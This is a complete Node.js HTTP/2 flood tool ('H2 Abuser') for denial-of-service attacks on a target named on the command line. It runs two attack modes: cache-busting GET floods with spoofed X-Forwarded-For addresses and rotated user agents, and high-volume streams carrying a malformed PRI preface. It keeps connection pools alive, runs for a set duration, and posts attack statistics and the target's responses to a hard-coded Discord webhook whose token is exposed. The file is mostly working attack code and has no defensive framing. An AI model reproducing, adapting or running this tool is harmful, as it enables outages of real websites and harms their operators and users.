const http2 = require('http2');
const { performance } = require('perf_hooks');
const crypto = require('crypto');

class H2Abuser {
    constructor(target, duration = 300) {
        this.target = target.replace('https://', '').replace('http://', '');
        this.duration = duration * 1000;
        this.running = true;
        
        // Stats
        this.df17Sent = 0;
        this.df17Hit = 0;
        this.loongSent = 0;
        this.loongHit = 0;
        this.destroyedReqs = 0;
        this.lastResponse = "NO RESPONSE YET";
        this.lastResponseTime = 0;
        
        // Connection pools with health tracking
        this.df17Sessions = [];
        this.loongSessions = [];
        this.sessionLocks = {
            df17: [],
            loong: []
        };
        
        // User agents
        this.samsungUAs = [
            "Mozilla/5.0 (Linux; Android 13; SAMSUNG SM-S918B) AppleWebKit/537.36 Chrome/120.0.6099.210 Mobile Safari/537.36",
            "Mozilla/5.0 (Linux; Android 12; SM-G998B) AppleWebKit/537.36 Chrome/120.0.6099.210 Mobile Safari/537.36",
            "Mozilla/5.0 (Linux; Android 11; SM-G991B) AppleWebKit/537.36 Chrome/120.0.6099.210 Mobile Safari/537.36",
            "Mozilla/5.0 (Linux; Android 13; SM-F936B) AppleWebKit/537.36 Chrome/120.0.6099.210 Mobile Safari/537.36",
        ];
        
        // Random IPs
        this.ips = [];
        for (let i = 0; i < 1000; i++) {
            this.ips.push(`${Math.floor(Math.random()*255)}.${Math.floor(Math.random()*255)}.${Math.floor(Math.random()*255)}.${Math.floor(Math.random()*255)}`);
        }
        
        console.log(`\x1b[35m[H2 ABUSER] Starting attack on ${this.target}\x1b[0m`);
        console.log(`DF-17: 1000-1700 reqs/batch | Loong II: 4000-7000 reqs/batch`);
        console.log('='.repeat(60));
        
        this.setupConnections();
    }
    
    createSession(type) {
        try {
            const session = http2.connect(`https://${this.target}`, {
                maxSessionMemory: 100,
                maxReservedRemoteStreams: 20000,
                maxConcurrentStreams: 1000
            });
            
            session.setMaxListeners(100);
            session.on('error', (err) => {
                // Session error - will be replaced
            });
            
            session.on('goaway', () => {
                // Mark for replacement
                setTimeout(() => this.replaceSession(session, type), 100);
            });
            
            session.on('close', () => {
                // Mark for replacement
                setTimeout(() => this.replaceSession(session, type), 100);
            });
            
            return session;
        } catch (err) {
            return null;
        }
    }
    
    replaceSession(oldSession, type) {
        const sessions = type === 'df17' ? this.df17Sessions : this.loongSessions;
        const locks = type === 'df17' ? this.sessionLocks.df17 : this.sessionLocks.loong;
        
        const index = sessions.indexOf(oldSession);
        if (index !== -1) {
            try { oldSession.destroy(); } catch {}
            
            // Create new session
            const newSession = this.createSession(type);
            if (newSession) {
                sessions[index] = newSession;
            }
        }
    }
    
    setupConnections() {
        // Create 3 H2 connections for each type
        for (let i = 0; i < 3; i++) {
            const df17Session = this.createSession('df17');
            if (df17Session) this.df17Sessions.push(df17Session);
            
            const loongSession = this.createSession('loong');
            if (loongSession) this.loongSessions.push(loongSession);
            
            // Initialize locks
            this.sessionLocks.df17.push(false);
            this.sessionLocks.loong.push(false);
        }
    }
    
    getAvailableSession(type) {
        const sessions = type === 'df17' ? this.df17Sessions : this.loongSessions;
        const locks = type === 'df17' ? this.sessionLocks.df17 : this.sessionLocks.loong;
        
        // Find unlocked session
        for (let i = 0; i < sessions.length; i++) {
            if (!locks[i] && sessions[i] && !sessions[i].destroyed) {
                locks[i] = true;
                return { session: sessions[i], index: i };
            }
        }
        
        // All locked, wait and retry (return null, will be retried)
        return null;
    }
    
    releaseSession(index, type) {
        const locks = type === 'df17' ? this.sessionLocks.df17 : this.sessionLocks.loong;
        if (index !== undefined) {
            locks[index] = false;
        }
    }
    
    randomIP() {
        return this.ips[Math.floor(Math.random() * this.ips.length)];
    }
    
    randomUA() {
        return this.samsungUAs[Math.floor(Math.random() * this.samsungUAs.length)];
    }
    
    // DF-17 Payload (Cache Buster)
    async df17Request() {
        const sessionInfo = this.getAvailableSession('df17');
        if (!sessionInfo) {
            // Queue for retry
            setTimeout(() => this.df17Request(), 10);
            return;
        }
        
        const { session, index } = sessionInfo;
        
        try {
            const cacheBuster = Math.floor(Date.now() / 1000);
            const ip = this.randomIP();
            const ua = this.randomUA();
            
            const headers = {
                ':method': 'GET',
                ':path': `/?cache_buster=${cacheBuster}`,
                ':authority': this.target,
                'user-agent': ua,
                'accept-language': 'en-US,en;q=0.9',
                'accept-encoding': 'gzip, deflate, br',
                'cache-control': 'no-cache, no-store, must-revalidate',
                'pragma': 'no-cache',
                'x-forwarded-for': ip
            };
            
            const start = performance.now();
            const req = session.request(headers);
            
            let responseData = '';
            
            req.on('response', () => {
                this.df17Hit++;
                this.lastResponseTime = Math.round(performance.now() - start);
            });
            
            req.on('data', (chunk) => {
                responseData += chunk.toString('utf8').slice(0, 200);
                if (responseData.length > 500) {
                    this.lastResponse = responseData.slice(0, 500);
                }
            });
            
            req.on('end', () => {
                if (responseData) {
                    this.lastResponse = responseData.slice(0, 500).replace(/\n/g, ' ').replace(/\r/g, '');
                }
                this.releaseSession(index, 'df17');
            });
            
            req.on('error', () => {
                this.destroyedReqs++;
                this.releaseSession(index, 'df17');
            });
            
            req.end();
            this.df17Sent++;
            
            // Timeout protection
            setTimeout(() => {
                if (!req.destroyed) {
                    req.destroy();
                    this.releaseSession(index, 'df17');
                }
            }, 5000);
            
        } catch (err) {
            this.destroyedReqs++;
            this.releaseSession(index, 'df17');
        }
    }
    
    // Loong II Payload (PRI Flood)
    async loongRequest() {
        const sessionInfo = this.getAvailableSession('loong');
        if (!sessionInfo) {
            // Queue for retry
            setTimeout(() => this.loongRequest(), 10);
            return;
        }
        
        const { session, index } = sessionInfo;
        
        try {
            const headers = {
                ':method': 'GET',
                ':path': '/',
                ':authority': this.target
            };
            
            const req = session.request(headers);
            
            // Send PRI payload (malformed)
            try {
                const priPayload = Buffer.from('PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n', 'ascii');
                req.write(priPayload);
            } catch {}
            
            req.on('response', () => {
                this.loongHit++;
            });
            
            req.on('end', () => {
                this.releaseSession(index, 'loong');
            });
            
            req.on('error', () => {
                this.destroyedReqs++;
                this.releaseSession(index, 'loong');
            });
            
            // End quickly
            setTimeout(() => {
                if (!req.destroyed) {
                    req.end();
                }
            }, 10);
            
            this.loongSent++;
            
            // Timeout protection
            setTimeout(() => {
                if (!req.destroyed) {
                    req.destroy();
                    this.releaseSession(index, 'loong');
                }
            }, 2000);
            
        } catch (err) {
            this.destroyedReqs++;
            this.releaseSession(index, 'loong');
        }
    }
    
    // DF-17 Batch: 1000-1700 reqs, no delay
    async df17Batch() {
        const count = Math.floor(Math.random() * 701) + 1000;
        const promises = [];
        
        for (let i = 0; i < count; i++) {
            if (!this.running) break;
            promises.push(this.df17Request());
        }
        
        await Promise.all(promises);
        console.log(`\x1b[36m[DF-17] Batch complete: ${count} reqs\x1b[0m`);
    }
    
    // Loong II Batch: 4000-7000 reqs, 50ms delay
    async loongBatch() {
        const count = Math.floor(Math.random() * 3001) + 4000;
        
        for (let i = 0; i < count; i++) {
            if (!this.running) break;
            await this.loongRequest();
            await new Promise(resolve => setTimeout(resolve, 50));
        }
        
        console.log(`\x1b[31m[Loong II] Batch complete: ${count} reqs\x1b[0m`);
    }
    
    // Main attack loops
    async startDF17() {
        while (this.running) {
            await this.df17Batch();
            await new Promise(resolve => setTimeout(resolve, Math.floor(Math.random() * 2000) + 1000));
        }
    }
    
    async startLoong() {
        while (this.running) {
            await this.loongBatch();
            await new Promise(resolve => setTimeout(resolve, Math.floor(Math.random() * 1000) + 2000));
        }
    }
    
    // Terminal logging
    terminalLog() {
        setInterval(() => {
            console.log(`\x1b[35m────────────────────────────────────\x1b[0m`);
            console.log(`\x1b[36mDF-17   - Sent: ${this.df17Sent} | Hit: ${this.df17Hit}\x1b[0m`);
            console.log(`\x1b[31mLoong II - Sent: ${this.loongSent} | Hit: ${this.loongHit}\x1b[0m`);
            console.log(`\x1b[33mDestroyed: ${this.destroyedReqs}\x1b[0m`);
            console.log(`\x1b[35m────────────────────────────────────\x1b[0m`);
        }, 1000);
    }
    
    // Discord logging (every 30s)
    discordLog() {
        const webhook = "https://discord.com/api/webhooks/1478989089045876779/fDm39Cls5AfZ0gZJM0sbhtJt59jo3i1Oy2_aHO3GmmSUw3gdg4pDfH7niEiXiA18ZJsM";
        
        const sendUpdate = () => {
            if (!this.running) return;
            
            const totalSent = this.df17Sent + this.loongSent;
            const totalHit = this.df17Hit + this.loongHit;
            
            const embed = {
                "title": "⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯",
                "color": 0x4a0e4a,
                "fields": [
                    {
                        "name": "NT-TOR",
                        "value": `\`\`\`Target: ${this.target}\`\`\``,
                        "inline": false
                    },
                    {
                        "name": "T-R-S",
                        "value": `\`\`\`${totalSent}\`\`\``,
                        "inline": true
                    },
                    {
                        "name": "T-H-R",
                        "value": `\`\`\`${totalHit}\`\`\``,
                        "inline": true
                    },
                    {
                        "name": "R-K-B-V",
                        "value": `\`\`\`${this.destroyedReqs}\`\`\``,
                        "inline": true
                    },
                    {
                        "name": "Target Latest Response",
                        "value": `\`\`\`${this.lastResponse}\n\nResponse Time: ${this.lastResponseTime}ms\`\`\``,
                        "inline": false
                    }
                ]
            };
            
            const https = require('https');
            const data = JSON.stringify({ embeds: [embed] });
            
            const options = {
                hostname: 'discord.com',
                path: `/api/webhooks/${webhook.split('/').slice(-2).join('/')}`,
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                    'Content-Length': data.length
                }
            };
            
            const req = https.request(options);
            req.on('error', () => {});
            req.write(data);
            req.end();
            
            setTimeout(sendUpdate, 30000);
        };
        
        sendUpdate();
    }
    
    // Session health checker
    healthCheck() {
        setInterval(() => {
            ['df17', 'loong'].forEach(type => {
                const sessions = type === 'df17' ? this.df17Sessions : this.loongSessions;
                
                for (let i = 0; i < sessions.length; i++) {
                    const session = sessions[i];
                    if (!session || session.destroyed) {
                        // Replace dead session
                        const newSession = this.createSession(type);
                        if (newSession) {
                            sessions[i] = newSession;
                        }
                    }
                }
            });
            
            if (global.gc) global.gc();
        }, 10000);
    }
    
    start() {
        console.log(`\x1b[32m[H2 ABUSER] Attack started on ${this.target} for ${this.duration/1000}s\x1b[0m`);
        
        // Start everything
        this.startDF17();
        this.startLoong();
        this.terminalLog();
        this.discordLog();
        this.healthCheck();
        
        // Stop after duration
        setTimeout(() => {
            this.running = false;
            console.log(`\n\x1b[32m[H2 ABUSER] Attack finished\x1b[0m`);
            console.log(`DF-17: ${this.df17Sent} sent, ${this.df17Hit} hit`);
            console.log(`Loong II: ${this.loongSent} sent, ${this.loongHit} hit`);
            console.log(`Destroyed: ${this.destroyedReqs}`);
            
            // Close all sessions
            [...this.df17Sessions, ...this.loongSessions].forEach(s => {
                try { if (!s.destroyed) s.destroy(); } catch {}
            });
            
            process.exit(0);
        }, this.duration);
    }
}

// Run
if (require.main === module) {
    const target = process.argv[2];
    const duration = parseInt(process.argv[3]) || 300;
    
    if (!target) {
        console.log('Usage: node h2abuser.js <target> [duration]');
        console.log('Example: node h2abuser.js example.com 300');
        process.exit(1);
    }
    
    const abuser = new H2Abuser(target, duration);
    abuser.start();
}
